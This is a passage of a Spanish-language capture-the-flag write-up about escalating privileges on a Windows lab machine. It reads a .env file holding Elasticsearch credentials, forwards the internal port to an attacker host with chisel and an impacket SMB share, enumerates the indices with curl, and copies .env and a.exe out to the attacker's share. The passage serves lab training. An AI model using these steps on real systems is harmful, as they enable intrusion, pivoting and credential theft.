+<p>Podemos leer la flag de usuario.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>C:\Users\ruben\Desktop&gt;type user.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>219f46b8c56553c19...
+</span></span></code></pre></div>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>Por alguna razón los proyectos Hugo sin compilar (código base) están en <code>C:\Temp\www\</code></p>
+<p>Aquí nos encontramos dos directorios, <code>app</code> e <code>internal</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>C:\Temp\www&gt;dir
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span> Volume Serial Number is CB08-11BF
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span> Directory of C:\Temp\www
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>06/09/2023  12:18 AM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>06/09/2023  12:18 AM    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>06/09/2023  12:18 AM    &lt;DIR&gt;          app
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>06/09/2023  12:18 AM    &lt;DIR&gt;          internal
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>               0 File(s)              0 bytes
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>               4 Dir(s)   4,564,426,752 bytes free
+</span></span></code></pre></div>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>C:\Temp\www\internal\content\posts&gt;dir
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span> Volume Serial Number is CB08-11BF
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span> Directory of C:\Temp\www\internal\content\posts
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>06/09/2023  12:20 AM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>06/09/2023  12:20 AM    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>06/09/2023  12:18 AM             1,755 first-re-research.md
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>06/09/2023  12:28 AM    &lt;DIR&gt;          internal-laps-alpha
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>06/09/2023  12:18 AM               493 no-more-laps.md
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>               2 File(s)          2,248 bytes
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>               3 Dir(s)   4,564,811,776 bytes free
+</span></span></code></pre></div>
+<p>Encontramos un post que no están publicado <code>no-more-laps.md</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>C:\Temp\www\internal\content\posts&gt;dir
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span> Volume Serial Number is CB08-11BF
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span> Directory of C:\Temp\www\internal\content\posts
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>06/09/2023  12:20 AM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>06/09/2023  12:20 AM    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>06/09/2023  12:18 AM             1,755 first-re-research.md
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>06/09/2023  12:28 AM    &lt;DIR&gt;          internal-laps-alpha
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>06/09/2023  12:18 AM               493 no-more-laps.md
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>               2 File(s)          2,248 bytes
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>               3 Dir(s)   4,564,811,776 bytes free
+</span></span></code></pre></div>
+<p>Y encontramos un directorio <code>internal-laps-alpha</code> que contiene un binario <code>a.exe</code></p>
+<p>También contiene un fichero <code>.env</code> con credenciales para una instancia de ElasticSearch.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>C:\Temp\www\internal\content\posts\internal-laps-alpha&gt;type .env
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>ELASTICUSER=user
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>ELASTICPASS=DumpPassword\$Here
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>ELASTICURI=https://127.0.0.1:9200
+</span></span></code></pre></div>
+<p>Leyendo el post..</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-markdown" data-lang="markdown"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>---
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>title: &#34;**INTERNAL** Getting rid of LAPS&#34;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>description: Replacing LAPS with out own custom solution
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>date: 2023-07-01
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>draft: true 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>tags: [internal, sysadmin] 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>---
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span><span style="font-weight:bold"># Intro
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span><span style="font-weight:bold"></span>We are getting rid of LAPS in favor of our own custom solution. 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>The password for the <span style="color:#0ff;font-weight:bold">`backup`</span> user will be stored in the local Elastic DB.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>IT will deploy the decryption client to the admin desktops once it it ready. 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>We do expect the development to be ready soon. The Malware RE team will be the first test group. </span></span></code></pre></div>
+<h1 id="reverse-port-forwarding">Reverse Port Forwarding</h1>
+<p>Vamos a compartirnos el puerto 9200 donde está el ElasticSearch a nuestra máquina con <code>chisel</code></p>
+<p>Con <code>impacket-smbserver</code> vamos a servidor bajo el recurso <code>smbFolder</code> el binario <code>chisel.exe</code> para pasarlo a la máquina víctima</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ sudo impacket-smbserver -smb2support smbFolder .
+</span></span></code></pre></div>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>C:\ProgramData&gt;copy \\10.10.14.125\smbFolder\chisel.exe chisel.exe
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>        1 file(s) copied.
+</span></span></code></pre></div>
+<p>Ahora en nuestra máquina de atacante nos ponemos en escucha con <code>chisel</code> para hacer reverse port forwarding por el puerto 1234</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ /opt/chisel/chisel server --reverse -p <span style="color:#ff0;font-weight:bold">1234</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>2024/08/27 18:01:42 server: Reverse tunnelling enabled
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>2024/08/27 18:01:42 server: Fingerprint bEQflnf3gWBSSWLT8J0cMyLsdZwrLMC5qP/FPXdEKAU=
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>2024/08/27 18:01:42 server: Listening on http://0.0.0.0:1234
+</span></span></code></pre></div>
+<p>Ahora en la máquina víctima nos pasamos con el binario de <code>chisel.exe</code> el puerto 9200 para que se convierta a nuestro puerto local 9200.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>:\ProgramData&gt;.\chisel.exe client 10.10.14.125:1234 R:9200:127.0.0.1:9200
+</span></span></code></pre></div>
+<p>Y vemos que todo ha salido bien en principio.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ /opt/chisel/chisel server --reverse -p <span style="color:#ff0;font-weight:bold">1234</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>2024/08/27 18:01:42 server: Reverse tunnelling enabled
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>2024/08/27 18:01:42 server: Fingerprint bEQflnf3gWBSSWLT8J0cMyLsdZwrLMC5qP/FPXdEKAU=
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>2024/08/27 18:01:42 server: Listening on http://0.0.0.0:1234
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>2024/08/27 18:03:02 server: session#1: tun: proxy#R:9200=&gt;9200: Listening
+</span></span></code></pre></div>
+<p>Podemos hacer una pequeña prueba y vemos que ahora en local tenemos el puerto 9200 abierto.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ nmap -p9200 127.0.0.1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-27 18:05 CEST
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>Nmap scan report for localhost (127.0.0.1)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>Host is up (0.000065s latency).
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span><span style="color:#f00"></span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>9200/tcp open  wap-wsp
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">9</span><span><span style="color:#f00"></span>Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
+</span></span></code></pre></div>
+<p>Nos pide autenticación.
+<img src="images/Screenshot_7.png" alt="Write-up Image"></p>
+<p>Vamos a probar con las credenciales que hemos visto antes -&gt; <code>user:DumpPassword$Here</code>.</p>
+<p>Y aquí tenemos el sitio.
+<img src="images/Screenshot_8.png" alt="Write-up Image"></p>
+<p>Vemos unas credenciales, <code>backupuser:tWUZG4e8QpWIwT8HmKcBiw</code></p>
+<p>Después de probarlas no servían para migrar a la cuenta de usuario <code>backup</code> que existe en la máquina víctima.</p>
+<h1 id="elasticsearch-enumeration">ElasticSearch Enumeration</h1>
+<p>Gracias a <a href="https://book.hacktricks.xyz/network-services-pentesting/9200-pentesting-elasticsearch">este artículo de HackTricks</a> podemos ayudarnos para enumerar a ver que información interesante conseguimos.</p>
+<p>Vemos dos índices, <code>seed</code> y <code>user-00001</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ curl <span style="color:#0ff;font-weight:bold">&#39;https://user:DumpPassword$Here@127.0.0.1:9200/_cat/indices?v&#39;</span> -k
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>health status index      uuid                   pri rep docs.count docs.deleted store.size pri.store.size
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>yellow open   seed       aqAoiRfuS2O2dAjhrgVs1A   1   1          1            0      3.3kb          3.3kb
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>yellow open   user-00001 aY6z82tqR6C73F0KczSMWA   1   1          1            0      5.4kb          5.4kb
+</span></span></code></pre></div>
+<p>Enumerando el índice <code>user-00001</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ curl <span style="color:#0ff;font-weight:bold">&#39;https://user:DumpPassword$Here@127.0.0.1:9200/user-00001/_search?pretty=true&#39;</span> -k
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>{
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>  &#34;took&#34; : 4,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>  &#34;timed_out&#34; : false,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>  &#34;_shards&#34; : {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>    &#34;total&#34; : 1,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>    &#34;successful&#34; : 1,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>    &#34;skipped&#34; : 0,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>    &#34;failed&#34; : 0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>  },
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>  &#34;hits&#34; : {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>    &#34;total&#34; : {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>      &#34;value&#34; : 1,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>      &#34;relation&#34; : &#34;eq&#34;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>    },
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>    &#34;max_score&#34; : 1.0,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>    &#34;hits&#34; : [
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>      {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>        &#34;_index&#34; : &#34;user-00001&#34;,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>        &#34;_id&#34; : &#34;tIAqlJEBwnHgAPO7iyz4&#34;,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>        &#34;_score&#34; : 1.0,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span>        &#34;_source&#34; : {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span>          &#34;blob&#34; : &#34;7GM0hTEK1IcpArBkUmIbZiQvmopg5Truh57rdp1uaS84nBRCWekG402RXYdj4y_YAhpFqIzEix0=&#34;,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span>          &#34;timestamp&#34; : &#34;2024-08-27T07:08:21.9776954-07:00&#34;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span>        }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span>      }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27</span><span>    ]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28</span><span>  }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29</span><span>}
+</span></span></code></pre></div>
+<p>Vemos una secuencia en base64 <code>7GM0hTEK1IcpArBkUmIbZiQvmopg5Truh57rdp1uaS84nBRCWekG402RXYdj4y_YAhpFqIzEix0=</code></p>
+<p>Pero se nos representa que no es un input válido.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ <span style="color:#fff;font-weight:bold">echo</span> <span style="color:#0ff;font-weight:bold">&#34;3IovgiWmZw6P_io9AcyoQ5GMiqJToDb69FeynB4wLSSMNrIPvY_BkGxovMEFi7KoJ6afXC6LjQ0=&#34;</span> | base64 -d
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>܊/%gbase64: invalid input
+</span></span></code></pre></div>
+<h2 id="reversing-aexe">Reversing <code>a.exe</code></h2>
+<p>Haciendo uso de la información obtenida en la nota, vamos a decompilar el binario <code>a.exe</code> a ver si este es el cliente para decompilar la credencial del usuario <code>backup</code></p>
+<p>Nos vamos a copiar a nuestra máquina el binario <code>a.exe</code> y el fichero <code>.env</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>C:\Temp\www\internal\content\posts\internal-laps-alpha&gt;copy .env \\10.10.14.125\smbFolder\.env
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>        1 file(s) copied.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>C:\Temp\www\internal\content\posts\internal-laps-alpha&gt;copy a.exe \\10.10.14.125\smbFolder\a.exe
